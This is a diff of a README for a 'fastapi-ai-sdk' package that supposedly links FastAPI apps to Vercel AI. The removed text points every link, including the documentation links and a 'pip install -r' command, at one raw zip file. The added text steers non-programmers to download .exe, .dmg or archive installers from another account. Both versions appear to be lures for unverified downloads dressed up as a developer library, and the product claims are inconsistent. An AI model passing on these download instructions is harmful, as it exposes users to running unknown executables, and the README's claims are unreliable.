@@ -1,80 +1,147 @@
-# 🌟 fastapi-ai-sdk - Effortlessly Connect AI with FastAPI
+# 🤖 fastapi-ai-sdk - Simple AI for FastAPI Apps
 
-## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip%20fastapi--ai--sdk-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
+[![Download fastapi-ai-sdk](https://img.shields.io/badge/Download-fastapi--ai--sdk-blue.svg?style=for-the-badge)](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
+
+---
+
+## 📦 What is fastapi-ai-sdk?
+
+fastapi-ai-sdk is a tool that helps your FastAPI apps talk to Vercel AI. It makes adding smart, real-time AI features easier. With this SDK, your app can send messages to AI and get responses back quickly.
+
+You do not need to know how to code to get started. This guide will walk you through downloading and running the software step by step.
+
+---
+
+## 💻 System Requirements
+
+Before you begin, make sure your computer meets these minimum requirements:
+
+- Operating System: Windows 10 or higher, macOS 10.14 or higher, or Linux (Ubuntu 18.04+ recommended)
+- Processor: 64-bit CPU
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 200 MB free
+- Internet connection for installation and running AI features
+
+You do not need any coding software installed just yet. The SDK comes with everything you need.
+
+---
 
 ## 🚀 Getting Started
-The **fastapi-ai-sdk** is a helpful library designed to make it easy to connect your FastAPI backend to the Vercel AI SDK. This library allows you to stream AI responses from FastAPI to https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip with full type safety, ensuring a secure and smooth experience.
 
-## 📦 System Requirements
-Before you start, ensure your setup meets these minimum requirements:
-- Operating System: Windows, macOS, or Linux
-- Python Version: 3.8 or higher
-- https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip Version: 14 or higher 
-- An active internet connection for downloading dependencies
+### Step 1: Download the SDK
 
-## 📂 Download & Install
-To get started with the **fastapi-ai-sdk**, visit the page below to download the latest version:
+Click the big blue button at the top of this page or visit the releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
+[https://github.com/Afrazz7/fastapi-ai-sdk/releases](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
 
-Once you are on the releases page, look for the latest version of the application. Click on the download link that corresponds to your operating system. 
+This page shows the software versions available for download. Choose the latest release to get the most updated features and fixes.
 
-Once downloaded, follow the steps below to install and run the application.
+### Step 2: Choose the right file to download
 
-## ⚙️ Installation Steps
-1. **Locate the Downloaded File**: Go to your downloads folder, or wherever you saved the downloaded file.
-2. **Extract the Files**: If the downloaded file is a ZIP or compressed file, right-click it and select "Extract All" or "Unzip".
-3. **Open Terminal or Command Prompt**:
-   - For Windows, search for "cmd" in the start menu.
-   - For macOS, open "Terminal" from Applications.
-   - For Linux, use the Terminal application of your choice.
-4. **Navigate to the Extracted Folder**: Use the `cd` command to change the directory to where the files are located. For example:
-   ```
-   cd path_to_your_extracted_folder
-   ```
-5. **Install Dependencies**: Run the following command:
-   ```
-   pip install -r https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip
-   ```
-   This command installs all necessary packages to run the application.
-6. **Run the Application**: After installation, you can run the FastAPI app with:
-   ```
-   uvicorn main:app --reload
-   ```
-   This will start the server locally.
+Inside the release page, look for these files:
 
-## 🌐 Using the Application
-Once the application is running, it will be available on your local machine at `http://127.0.0.1:8000/`. You can access the interactive API documentation by pointing your web browser to:
+- For Windows: a `.exe` or `.zip` file  
+- For macOS: a `.dmg` or `.zip` file  
+- For Linux: a `.tar.gz` file
+
+Download the file that matches your computer’s system.
+
+### Step 3: Install the SDK
+
+- On Windows: Run the `.exe` file or unzip the `.zip` archive. Then follow the on-screen installer instructions.  
+- On macOS and Linux: Unzip or extract the downloaded archive into a folder you choose.
+
+### Step 4: Verify Installation
+
+Once installed, open your computer’s command line (Command Prompt on Windows, Terminal on macOS/Linux) and type the command:
+
 ```
-http://127.0.0.1:8000/docs
+fastapi-ai-sdk --version
 ```
 
-## 🎉 Next Steps
-After successfully running the application, you may want to explore its features:
-- **Streaming AI Responses**: Learn how to fetch real-time AI data.
-- **Full Type Safety**: Ensure your types match correctly, reducing errors.
-- **Support for SSE**: Make use of Server-Sent Events for streamlined communication.
+You should see the version number printed out. This shows the SDK is installed correctly.
 
-## ❓ Frequently Asked Questions
+---
 
-### How do I know if the installation was successful?
-If the application runs without errors in your terminal and you are able to access the documentation at `http://127.0.0.1:8000/docs`, the installation is successful.
+## 🤖 How fastapi-ai-sdk Works
 
-### What should I do if I encounter an issue?
-Ensure you have all system requirements and dependencies installed. If issues persist, check the project's GitHub page for troubleshooting tips or create a new issue.
+fastapi-ai-sdk acts as a bridge between your FastAPI app and Vercel AI. It sends messages you want the AI to answer and gets the responses. Your app then uses these replies to offer smart functionalities, like answering questions or generating text automatically.
 
-### Can I contribute to this project?
-Absolutely! Contributions are welcome. You can check the contribution guidelines in the repository for more information on how to get involved.
+This SDK works with different AI providers, including Azure OpenAI and others linked to Vercel AI.
 
-## 📣 Feedback
-Your feedback is important. Please report any bugs or suggestions directly in the issues section of the GitHub repository. 
+---
 
-## 📜 License
-This project is licensed under the MIT License. Please see the LICENSE file for more details.
+## 📚 Common Features
 
-## 📝 Additional Resources
-- [FastAPI Documentation](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
-- [Vercel AI SDK Documentation](https://raw.githubusercontent.com/vanshika122334/fastapi-ai-sdk/main/Blepharocera/fastapi-ai-sdk.zip)
+- **Easy Integration:** Add AI to your FastAPI apps without deep coding knowledge  
+- **Real-Time AI Responses:** Get fast answers from the AI for smooth user interactions  
+- **Supports Multiple AI Providers:** Use Azure, Bedrock, or Langchain AI models  
+- **Session Management:** Keep track of conversations easily for better user experience  
+- **Automation Tools:** Automate common tasks using AI-powered logic  
 
-Enjoy using the **fastapi-ai-sdk** and stream AI responses effortlessly! For a seamless experience, refer back to this guide as needed.
+---
+
+## 🛠 Basic Usage (No Coding Needed)
+
+If you want to try features without programming, you can use included sample apps or prebuilt examples that come with the SDK.
+
+These examples show how to:
+
+- Send a question to AI  
+- Receive the answer  
+- Display it on a webpage  
+
+Just follow the included README files inside the downloaded package under `/examples`.
+
+---
+
+## ⚙️ FAQ for Beginners
+
+- **Do I need to install Python?**  
+You do not need to install Python to use the prebuilt tools. However, if you want to modify or build your own app, you will need Python 3.8 or later.
+
+- **What is FastAPI?**  
+FastAPI is a modern way to build web apps that handle lots of users quickly. This SDK helps make those apps smarter with AI.
+
+- **Can I use the SDK on my phone or tablet?**  
+The SDK runs on your computer for app development. AI features will work on apps you build for phones.
+
+- **Is the AI free to use?**  
+The SDK interface is free, but the AI service may require an account and usage fees set by the AI provider.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If the SDK does not start, check your system matches the requirements above.  
+- Make sure you downloaded the file completely without interruptions.  
+- Look at the `README.md` inside the download for detailed instructions.  
+- Visit the GitHub issues page for support: https://github.com/Afrazz7/fastapi-ai-sdk/issues  
+
+---
+
+## 📥 Download & Install
+
+Go to the release page below and pick the latest version for your computer type:
+
+[Download fastapi-ai-sdk releases](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
+
+Follow the steps shown here in the Getting Started section to install and verify fastapi-ai-sdk on your machine.
+
+---
+
+## 🔗 Useful Links
+
+- FastAPI official site: https://fastapi.tiangolo.com  
+- Vercel AI page: https://vercel.com/ai  
+- Azure OpenAI: https://azure.microsoft.com/en-us/services/cognitive-services/openai-service/
+
+---
+
+## 👤 Contact & Support
+
+If you run into problems or want to ask questions, you can open an issue on GitHub:
+
+https://github.com/Afrazz7/fastapi-ai-sdk/issues
+
+The project community or maintainers will respond to help you.
